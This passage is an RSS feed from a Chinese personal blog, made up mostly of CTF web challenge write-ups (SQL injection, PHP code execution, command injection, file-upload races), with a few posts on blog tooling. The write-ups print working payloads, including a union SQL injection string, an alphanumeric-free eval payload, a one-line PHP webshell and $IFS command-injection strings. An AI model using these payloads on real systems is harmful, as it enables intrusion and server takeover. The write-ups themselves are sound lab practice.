      <description>进入页面直接报错&#xA;试试其他的地方，我的习惯是git泄露、请求头、robots.txt、hint.txt都看看。果然在robots下有内容&#xA;User-agent: * Disallow: /fAke_f1agggg.php&#xA;访问fAke_f1agggg.php并且抓包，在响应头里有提示。&#xA;访问fl4g.php才正式开始，源码如下：&#xA;&amp;lt;img src=&amp;#34;/img.jpg&amp;#34;&amp;gt; &amp;lt;?php header(&amp;#39;Content-type:text/html;charset=utf-8&amp;#39;); error_reporting(0); highlight_file(__file__); //level 1 if (isset($_GET[&amp;#39;num&amp;#39;])){ $num = $_GET[&amp;#39;num&amp;#39;]; if(intval($num) &amp;lt; 2020 &amp;amp;&amp;amp; intval($num + 1) &amp;gt; 2021){ echo &amp;#34;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&amp;lt;/br&amp;gt;&amp;#34;; }else{ die(&amp;#34;金钱解决不了穷人的本质问题&amp;#34;); } }else{ die(&amp;#34;去非洲吧&amp;#34;); } //level 2 if (isset($_GET[&amp;#39;md5&amp;#39;])){ $md5=$_GET[&amp;#39;md5&amp;#39;]; if ($md5==md5($md5)) echo &amp;#34;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&amp;lt;/br&amp;gt;&amp;#34;; else die(&amp;#34;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&amp;#34;); }else{ die(&amp;#34;去非洲吧&amp;#34;); } //get flag if (isset($_GET[&amp;#39;get_flag&amp;#39;])){ $get_flag = $_GET[&amp;#39;get_flag&amp;#39;]; if(!</description>
    </item>
    <item>
      <title>SWPU2019 Web1</title>
      <link>/posts/ctf/swpu2019web1/</link>
      <pubDate>Thu, 15 Apr 2021 09:55:17 +0000</pubDate>
      <guid>/posts/ctf/swpu2019web1/</guid>
      <description>一个登陆界面，再看下url地址为login.php，确认了使用的是php&#xA;直接查看源码，在源码中找到了register.php。先注册一个进去看一看。&#xA;是一个发布广告的信息页，发布广告时需要输入广告的标题和内容，联想一下之前做过的发布文章的，应该是sql注入，输入广告标题输入一个单引号&#39;试一试&#xA;广告详情中出现了数据库报错&#xA;猜测应该是二次注入，发布时加上一些转义字符没有出现错误，但是查看详情时再次从数据库中取出带有payload的数据，可以执行sql语句。而且上面的单引号测试出来了是字符型单引号闭合。&#xA;接下来是尝试过滤。我试出来的有空格（使用/**/绕过）、or，and（可以使用&amp;amp;&amp;amp;，||），同时or被过滤，就说明保存数据库表名的库information_schema没有办法查询，并且orderby也不能使用，需要使用其他办法获取表内容。&#xA;测试一下当前表的字段数，从1开始加，一直会报字段数不匹配，直到尝试到22。还需要主义的是执行的sql语句后面的 LIMIT 0,1需要闭合，所以最后添加了一个单引号&#xA;&amp;#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39; 说明回显位是2和3。&#xA;由于没有办法查询表名，所以需要我们自己猜测，CTF比赛中常见的表名就是flag、users、举办方的缩写啥的。这种没有办法查询表名的题目表名应该都不会设置太难&#xA;测试的语句&#xA;&amp;#39;/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39; 当测到users表时返回了当前字段数不匹配的错误，说名users里有多个字段，肯定没有办法显示在一列中。所以接下来是猜users表的字段数。&#xA;首先讲解一波无列名注入。&#xA;先来个正常表（flag）的查询&#xA;我们知道在sql语句查询的时候，可以给列名起别名形如&#xA;使用联合查询的时候，只要前后表的字段数相同，前面查询的就会成为表名&#xA;所以当我们不知道flag表的字段，并且想要查询里面的内容时，比如我想查询flag表的flag字段，可以构造&#xA;需要为子查询的结果再起一个别名（图中为x），这样我们就不用列名查询到了字段。总结一下思路就是：自己构造一个表名并且联合查询想要查询的表名，再使用group_concat函数输出自己构造的表名。&#xA;所以测试users表的字段数时，就通过形如上图的格式，改变联合查询的字段数判断。&#xA;最终的payload：&#xA;&amp;#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39; </description>
    </item>
    <item>
      <title>BUUCTF寒假刷题-Web</title>
      <link>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</link>
      <pubDate>Mon, 18 Jan 2021 16:58:56 +0000</pubDate>
      <guid>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</guid>
      <description>寒假横向刷题（尽量） BUUCTF 💗🧡💛💚💙💜🤎🖤🤍 题都写这一个里面了，可以先用Ctrl+F搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨&#xA;2021.01.15 [HCTF 2018]WarmUp 进到靶机一个硕大的滑稽，查看源码有提示source.php&#xA;&amp;lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;amp;$page) { $whitelist = [&amp;#34;source&amp;#34;=&amp;gt;&amp;#34;source.php&amp;#34;,&amp;#34;hint&amp;#34;=&amp;gt;&amp;#34;hint.php&amp;#34;]; if (! isset($page) || !is_string($page)) { echo &amp;#34;you can&amp;#39;t see it&amp;#34;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . &amp;#39;?&amp;#39;, &amp;#39;?</description>
    </item>
    <item>
      <title>极客大挑战 2019 RCE ME</title>
      <link>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</link>
      <pubDate>Sat, 05 Dec 2020 20:42:00 +0000</pubDate>
      <guid>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</guid>
      <description>[极客大挑战 2019]RCE ME 源码：&#xA;&amp;lt;?php error_reporting(0); if(isset($_GET[&amp;#39;code&amp;#39;])){ $code=$_GET[&amp;#39;code&amp;#39;]; if(strlen($code)&amp;gt;40){ die(&amp;#34;This is too Long.&amp;#34;); } if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){ die(&amp;#34;NO.&amp;#34;); } @eval($code); } else{ highlight_file(__FILE__); } // ?&amp;gt; 分析一波，GET请求获得code，想要通过的话需要绕过两个检测：&#xA;payload长度小于40 不能包含a-z、A-Z、0-9 和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:一些不包含数字和字母的webshell，这次摸到了相关文章：无字母数字webshell之提高篇。&#xA;使用url编码+~取反构造不可见字符串，然后加上php7版本以后支持了使用：($a)()这样的方法动态执行函数，所以我们可以构造payload：assert(eval($_POST[‘a’]))&#xA;先构造assert：&#xA;echo urlencode(~&amp;#39;assert&amp;#39;); //结果：%9E%8C%8C%9A%8D%8B 再构造eval($_POST[&#39;a&#39;])：&#xA;echo urlencode(~&amp;#39;eval($_POST[\&amp;#39;a\&amp;#39;])&amp;#39;); //结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6 完整payload：&#xA;?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6); 网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的~取反再获得真正的函数名。&#xA;使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是ELF是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回ret=127：&#xA;搜索了一波，原来是是disable_function搞的鬼，这个表可以在phpinfo()中查看：&#xA;因为system、exec、shell_exec等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过disable_function的方法，网上有很多其他方法，其中一个方法：&#xA;利用环境变量LD_PRELOAD来绕过&#xA;php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的&#xA;LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。&#xA;正好蚁剑的插件中就有一个名为：as_bypass_php_disable_functions的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：&#xA;插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的/var/www/html目录是没有上传权限的，我右键以后发现能修改权限，改成0777：&#xA;在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。&#xA;上传一句话木马233.php：&#xA;&amp;lt;?php @eval($_POST[&amp;#39;b&amp;#39;]); 再用一句话木马的shell执行插件：&#xA;进入shell，目录下面多了一个名为**.antproxy.php**的文件：&#xA;再使用蚁剑连接**.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。&#xA;flag{a216900e-2427-48f7-9323-f65d0a3abdbf}</description>
    </item>
    <item>
      <title>GXYCTF2019 Ping Ping Ping</title>
      <link>/posts/ctf/gxyctf2019ping-ping-ping/</link>
      <pubDate>Fri, 04 Dec 2020 20:24:50 +0000</pubDate>
      <guid>/posts/ctf/gxyctf2019ping-ping-ping/</guid>
      <description>[GXYCTF2019]Ping Ping Ping 题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping&#xA;和DMCTF做的那道pingpingping类似，同样是使用管道符构造payload，先使用：&#xA;?ip=127.0.0.1|ls 目录下有两个文件：flag.php、index.php。首先试出来了空格被过滤，使用以下绕过空格：&#xA;$IFS&#xD;${IFS}&#xD;$IFS$1 //$1改成$加其他数字貌似都行&#xD;&amp;lt; &amp;lt;&amp;gt; {cat,flag.php} //用逗号实现了空格功能&#xD;%20 %09 在linux下反单引号里面的指令会被执行 `ls`&#xA;?ip=|cat$IFS`ls` 会输出该目录下所有可以打开的文件，可以查看index.php的部分源码有哪些过滤：&#xA;/?ip=|\&amp;#39;|\&amp;#34;|\\|\(|\)|\[|\]|\{|\}/&amp;#34;, $ip, $match)){ echo preg_match(&amp;#34;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x{00}-\x{20}]|\&amp;gt;|\&amp;#39;|\&amp;#34;|\\|\(|\)|\[|\]|\{|\}/&amp;#34;, $ip, $match); die(&amp;#34;fxck your symbol!&amp;#34;); } else if(preg_match(&amp;#34;/ /&amp;#34;, $ip)){ die(&amp;#34;fxck your space!&amp;#34;); } else if(preg_match(&amp;#34;/bash/&amp;#34;, $ip)){ die(&amp;#34;fxck your bash!&amp;#34;); } else if(preg_match(&amp;#34;/.*f.*l.*a.*g.*/&amp;#34;, $ip)){ die(&amp;#34;fxck your flag!&amp;#34;); } $a = shell_exec(&amp;#34;ping -c 4 &amp;#34;.$ip); echo &amp;#34; &amp;#34;; print_r($a); } ?&amp;gt; 一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问flag.php。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用readflag的ELF执行文件访问，但是还没成功。其实执行：&#xA;?ip=|cat$IFS`ls` 这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了我是傻逼。&#xA;最后记录下学到的姿势和这道题目的其他思路：</description>
    </item>
    <item>
      <title>DMCTF之Misc</title>
      <link>/posts/ctf/dmctf%E4%B9%8Bmisc/</link>
      <pubDate>Tue, 01 Dec 2020 11:20:45 +0000</pubDate>
      <guid>/posts/ctf/dmctf%E4%B9%8Bmisc/</guid>
      <description>前言 这次比赛是第一次做Mics的题awa。&#xA;Misc Check_in 真·有手就行&#xA;fakezip 看到题目fakezip翻译：假的压缩包，所以猜应该是伪加密，贴一个原理的博客：zip伪加密，使用010 Editor打开压缩包，&#xA;找到01修改为00，再解压压缩包，虽然提示了压缩包错误但是直接无视，获得一个flag.txt&#xA;打开以后内容是：♬♩¶♯♬♭♬♫♫♪♬∮♬♭‖♭♬♭♬∮♬♭‖♭♬♭♫♫♯=，音符加密虽然是第一次听说，但是百度还是可以简单找到：文本加密为音乐符号&#xA;Base family 题目给出了是base家族，所以base所有种类都试一遍。base常见的种类有：base16、base32、base58、base64、base91。还有几种没听过的base种类可以在这个网站找到：CTF在线工具。&#xA;原层：&#xA;XUZbB{fp}U)=ql[n%GCbk9RZ7!XD$D)f1G{011LN(TSlXCJT:4nxQ[8Y#I:=k.Qi4t3/S!,N/%[I}^8jjP|0&amp;amp;whvi88gpQce(2lKt9ZHiT^g1.nZH,k=kjTT16pHJ_DrW,Td&amp;#34;^w$Q8+8T])e.llK?*z`gS:+C]llUG:z1=ekEN}8DmJf&amp;amp;GP&amp;lt;Rk:o_Jk&amp;lt;J.zp8%H0g7sYSTJ9p.&amp;#34;duRBGj`g0!I+xjm(fh)]IF:&amp;gt;omN8=m+Xp(X0:U*8Sj5|8p._o[i0:%.qu}%_=&amp;lt;D base91解码：&#xA;3G6MzYGwFwTsqcb3MWzTdQBTHZWBZ2LUBprZ3P62T2nsbt1R7o6a7PEsXsBvSFvoexeZJEkhW9Wv1VusvpWK1nfWsVHDypW2j3MMEygzSYLmwxKV5kNwWomvXc5ohX2Jgj6bMRnu6JXkasXdbbw3Aw8Pvh6vWwPfTZ4mpkpNU9fDhyNi1bciCZMXeLiCWL67BVupHPobQcFWkpftgLPggB8wgwW base58解码：&#xA;JZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5 base32解码：&#xA;NjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q= base64解码：&#xA;666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d hex解码：&#xA;flag{y0u_alr3ady_kn0w_th3_Basefam1ly} SlientEye 根据题目直接百度SlientEye，下载以后打开图片&amp;ndash;&amp;gt;decode：&#xA;参数啥的都没动，密码为默认密码，直接Decode，得到一个flag.txt：&#xA;&amp;amp;#102;&amp;amp;#108;&amp;amp;#97;&amp;amp;#103;&amp;amp;#123;&amp;amp;#110;&amp;amp;#49;&amp;amp;#95;&amp;amp;#98;&amp;amp;#117;&amp;amp;#95;&amp;amp;#106;&amp;amp;#49;&amp;amp;#97;&amp;amp;#110;&amp;amp;#103;&amp;amp;#95;&amp;amp;#119;&amp;amp;#117;&amp;amp;#95;&amp;amp;#100;&amp;amp;#51;&amp;amp;#125; 再去百度搜到一篇博客：&amp;amp;#x开头的是什么编码?，我点开一看，哦，原来是entity code实体编码，我啪的一下就把flag.txt改为flag.html，很快啊，然后是一个左正蹬、一个右鞭腿、一个左刺拳打开flag.html获得flag：flag{n1_bu_j1ang_wu_d3}&#xA;编码之王 下载文件打开后一堆社会主义核心价值观，前面提到的：CTF在线工具就有核心价值观编码，下面放密文，上面是解码内容。&#xA;解出来以后看到第一句：如是我闻:，&amp;ndash;&amp;gt;与佛论禅&#xA;再解之后看第一句：新佛曰：。&amp;ndash;&amp;gt;新与佛论禅&#xA;解完以后直接出了一堆由：[、]、!、+、(、)组成的符号，还是百度找到了这种编码叫JSfuck，可以直接浏览器控制台console输出获得flag&#xA;jpgsteg 题目即是用到的工具，百度下载软件，使用jphide.exe打开图片Tap code.jpg，选择seek功能解密，密码为123456（我蒙的）：&#xA;成功解密后获得一个文档，内容如下：&#xA;... ....&#xD;.. ...&#xD;.. ...&#xD;. .&#xD;... ..&#xD;. .&#xD;..... .....&#xD;.. ....&#xD;... ...&#xD;.. .. 这里我思索了好久，刚开始以为是摩斯密码，但是又对不上号，最后找到了一个名为敲击码的，正好一行中的.分成两部分代表坐标&#xA;解码得到：ohhamazing ，加上括号就是：flag{ohhamazing}&#xA;事后多看了一眼图片命名：Tap code.jpg。这用啥解密不就在脸上写着的wosabi \0/。。。&#xA;Collision 打开压缩包发现都是加密，但是原始大小都为4，只有CRC不一样：&#xA;所以很有可能是四位数据的CRC32碰撞，就去网上找了一个python脚本：crc32碰撞 ctf python作者原创的脚本：</description>
    </item>
    <item>
      <title>PicGo复制自定义链接</title>
      <link>/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Mon, 30 Nov 2020 09:54:11 +0000</pubDate>
      <guid>/posts/play_time/picgo%E5%A4%8D%E5%88%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%93%BE%E6%8E%A5/</guid>
      <description>2022年2月3日22:41:32&#xA;！！！！！&#xA;建议直接看文章末尾，我发现我就是个笨比。&#xA;前言 现在博客里面的图片使用的是github+jsdelivr+PicGo图床。PicGo是一个开源的上传图片的软件，支持大部分图床的上传，只需要设置对应的图床参数即可一键上传。github上PicGo的概述：&#xA;PicGo: 一个用于快速上传图片并获取图片 URL 链接的工具&#xA;PicGo 本体支持如下图床：&#xA;七牛图床 v1.0 腾讯云 COS v4\v5 版本 v1.1 &amp;amp; v1.5.0 又拍云 v1.2.0 GitHub v1.5.0 SM.MS V2 v2.3.0-beta.0 阿里云 OSS v1.6.0 Imgur v1.6.0 本体不再增加默认的图床支持。你可以自行开发第三方图床插件。&#xA;项目地址：PicGo&#xA;软件界面：&#xA;起因 PicGo上传成功以后可以自动复制url，但是默认复制的图片链接是github提供的，github在国内又经常抽风，图片通常都是无法访问的，所以我使用了jsdelivr提供的链接访问图片，PicGo也提供了自定义链接，但是规定必须包含$url参数，也就是默认的url地址：&#xA;起初是把jsdelivr的链接直接拼在后面，每次使用的时候都再删一次。直到昨晚受不了了就尝试去修改软件试图绕过判断。&#xA;解决方法 在软件设置的配置文件里找到了customLink，和之前自己设置的链接对照了一下，认为这个就是实际的自定义链接，直接在此处修改，再上传自动复制的链接就正确了，而且绕过了必须包含$url。&#xA;结语 软件提供了自动使用时间戳重命名，所以我自定义链接中还是使用了$filename变量，然后博客中的图片大部分都是使用QQ的截屏功能，出来的截图后缀都是png格式，这个可以根据需要自己设定拼接，然后使用的markdown编辑器是typora，想要添加图片直接Crtl+Shift+i，把图片链接贴里面就彳亍了。白嫖真爽&#xA;2022-1-31 11:43:48&#xA;这时候发现自定义链接直接用markdown格式就更好了&#xA;![$fileName](https://cdn.jsdelivr.net/gh/username/repo@master/artical/$fileName.png) 最简单修改 前面的都是我在改自定义链接，至少明白了可以绕过自定义链接必须包含变量名称这个限制。&#xA;直接在自定义域名那里修改成jsDeliver对应的仓库路径，比如我的&#xA;https://cdn.jsdelivr.net/gh/penginman/PicBed@master 然后返回的链接就会把原来的raw.github.com/xxxxxx给替代了。</description>
    </item>
    <item>
      <title>DMCTF之Web</title>
      <link>/posts/ctf/dmctf%E4%B9%8Bweb/</link>
      <pubDate>Sun, 29 Nov 2020 23:17:50 +0000</pubDate>
      <guid>/posts/ctf/dmctf%E4%B9%8Bweb/</guid>
      <description>前言 比赛地址：http://dmctf.vaala.cloud:81&#xA;这次先写Web题目部分，我最后的排名：&#xA;Web weak_type 源码：&#xA;PHP&#xD;&amp;lt;?php&#xD;show_source(__FILE__);&#xD;include(&amp;#39;class.php&amp;#39;);&#xD;//level1 if(isset($_GET[&amp;#39;num&amp;#39;])){&#xD;$num = $_GET[&amp;#39;num&amp;#39;];&#xD;if($num===&amp;#34;202020020&amp;#34;){&#xD;die(&amp;#34;no no no!&amp;#34;);&#xD;}&#xD;if(intval($num,0)===202020020){&#xD;echo &amp;#34;&amp;lt;br&amp;gt; level 1 Ok &amp;lt;br&amp;gt;&amp;#34;;&#xD;}else{&#xD;die(&amp;#39;what are you doing?&amp;#39;);&#xD;}&#xD;}else{&#xD;die();&#xD;}&#xD;//level 2&#xD;if(isset($_GET[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;])){&#xD;$v1 = $_GET[&amp;#39;v1&amp;#39;];&#xD;$v2 = $_GET[&amp;#39;v2&amp;#39;];&#xD;if($v1 != $v2 &amp;amp;&amp;amp; md5($v1)==md5($v2)){&#xD;echo &amp;#34;&amp;lt;br&amp;gt; level 2 Ok &amp;lt;br&amp;gt;&amp;#34;;&#xD;}else{&#xD;die(&amp;#39;Are you kidding me ?&amp;#39;);&#xD;}&#xD;}else{&#xD;die();&#xD;}&#xD;//level 3 if (isset($_POST[&amp;#39;message&amp;#39;])) {&#xD;$message = json_decode($_POST[&amp;#39;message&amp;#39;]);&#xD;if ($message-&amp;gt;key == $key) {&#xD;echo &amp;#34;&amp;lt;br&amp;gt; Wow you got it !</description>
    </item>
    <item>
      <title>jsdelivr 缓存刷新</title>
      <link>/posts/play_time/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/</link>
      <pubDate>Fri, 20 Nov 2020 22:02:46 +0000</pubDate>
      <guid>/posts/play_time/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/</guid>
      <description>前言 ​&#x9;上一篇修改了黑幕，但是使用了jsdelivr加速的静态资源，所以照常更新下github上的资源，但是github上查看已经上传成功了，jsdelivr访问的依然是之前的资源，说白了就是缓存的问题。即使本地浏览器端的缓存已经清理，也会因为CDN周围的节点没有同步数据而导致用户端未能及时更新。&#xA;缓存刷新 把原来访问的链接&#xA;https://cdn.jsdelivr.net/...&#xA;改为&#xA;https://purge.jsdelivr.net/...&#xA;访问资源就会进行刷新，然后页面会返回刷新信息：&#xA;划水收工。</description>
    </item>
    <item>
      <title>萌娘百科黑幕实现</title>
      <link>/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/</link>
      <pubDate>Fri, 20 Nov 2020 10:13:07 +0000</pubDate>
      <guid>/posts/play_time/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/</guid>
      <description>前言 ​&#x9;老早就觉得萌娘百科里的黑幕很好玩，所以摸索着给自己博客加了一个。参考博客Re：萌娘百科上的黑幕实现。不过我改的方法有稍稍有点不同，是把hexo渲染markdown文章中的删除线~~ ~~标签修改了。我回来又想到了更好的方法，markdown支持文章中的自定义标签，自己增加一个&amp;lt;span class=&#39;heimu&#39;&amp;gt;...&amp;lt;/span&amp;gt;标签更好。那么两种都记一下吧。当然用自定义标签的话还可以保留删除线。&#xA;示例 我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气&#xA;我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气&#xA;我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气&#xA;我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气&#xA;我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气&#xA;原博客图&#xA;萌娘百科官方介绍&#xA;准备工作 ​&#x9;先进入主题的资源文件夹themes\butterfly\source\，修改需要用到的文件css\_global\index.styl、js/main.js。&#xA;​&#x9;说明一下两个文件的作用：主题的总样式表index.css是经过整合形成的，而**.styl文件是基于Node.js的CSS的预处理框架**，我们会在这个里面添加黑幕的样式。main.js里面使用选择器为标签添加title=&#39;你知道的太多了&#39;，这个可以修改成自己喜欢的。&#xA;修改自定义标签 在index.styl文件末尾添加 .heimu, .heimu a, a .heimu, .heimu a.new, .heimu code background-color: #252525 !important color: #252525 !important text-shadow: none .heimu:hover, .heimu:active, .heimu:hover .heimu, .heimu:active .heimu,.heimu code:hover color: white !important; .heimu:hover a, a:hover .heimu, .heimu:active a, a:active .heimu color: lightblue !important; .heimu:hover .new, .heimu .new:hover, .new:hover .heimu, .heimu:active .new, .heimu .new:active, .new:active .heimu color: #BA0000 !</description>
    </item>
    <item>
      <title>Upload-Labs的最后几道题</title>
      <link>/posts/ctf/upload-labs5/</link>
      <pubDate>Thu, 19 Nov 2020 08:47:19 +0000</pubDate>
      <guid>/posts/ctf/upload-labs5/</guid>
      <description>Pass-17 ​&#x9;（windows环境，php版本5.2.17，题号是18题）&#xA;源码：&#xA;$is_upload = false; $msg = null; if(isset($_POST[&amp;#39;submit&amp;#39;])){ $ext_arr = array(&amp;#39;jpg&amp;#39;,&amp;#39;png&amp;#39;,&amp;#39;gif&amp;#39;); $file_name = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]; $temp_file = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;]; $file_ext = substr($file_name,strrpos($file_name,&amp;#34;.&amp;#34;)+1); $upload_file = UPLOAD_PATH . &amp;#39;/&amp;#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . &amp;#39;/&amp;#39;. rand(10, 99).date(&amp;#34;YmdHis&amp;#34;).&amp;#34;.&amp;#34;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &amp;#34;只允许上传.jpg|.png|.gif类型文件！&amp;#34;; unlink($upload_file); } }else{ $msg = &amp;#39;上传出错！&amp;#39;; } } ​&#x9;思路和前面的一样，获取文件信息，移动文件到upload文件夹，第12行使用了白名单验证，多了第14行的rename函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了上传竞争，使用python脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码&amp;lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&amp;lt;?php phpinfo();?&amp;gt;&#39;);?&amp;gt;这段代码执行以后，会创建一个名为shell.php里面有一句&amp;lt;?php phpinfo();?&amp;gt;的文件。&#xA;​&#x9;脚本代码&#xA;#coding=utf-8 import requests from multiprocessing import Pool def CompeteUpload(list): url=&amp;#34;http://upload-labs/Pass-18/index.</description>
    </item>
    <item>
      <title>Upload-Labs之Pass-16</title>
      <link>/posts/ctf/upload-labs4/</link>
      <pubDate>Mon, 16 Nov 2020 22:50:25 +0000</pubDate>
      <guid>/posts/ctf/upload-labs4/</guid>
      <description>前言 ​&#x9;我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。&#xA;​&#x9;参考博客：upload-labs之pass 16详细分析&#xA;Pass-16 ​&#x9;源码（三种图片的判定，只贴一个吧，篇幅小一点）：&#xA;$is_upload = false; $msg = null; if (isset($_POST[&amp;#39;submit&amp;#39;])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;]; $filetype = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;type&amp;#39;]; $tmpname = $_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;]; $target_path=UPLOAD_PATH.&amp;#39;/&amp;#39;.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&amp;#34;.&amp;#34;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &amp;#34;jpg&amp;#34;) &amp;amp;&amp;amp; ($filetype==&amp;#34;image/jpeg&amp;#34;)){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = &amp;#34;该文件不是jpg格式的图片！&amp;#34;; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&amp;#34;.jpg&amp;#34;; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&amp;#39;/&amp;#39;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = &amp;#34;上传出错！&amp;#34;; } }else if(($fileext == &amp;#34;png&amp;#34;) &amp;amp;&amp;amp; ($filetype==&amp;#34;image/png&amp;#34;)){ .</description>
    </item>
    <item>
      <title>Upload-Labs(三)</title>
      <link>/posts/ctf/upload-labs3/</link>
      <pubDate>Mon, 16 Nov 2020 16:04:30 +0000</pubDate>
      <guid>/posts/ctf/upload-labs3/</guid>
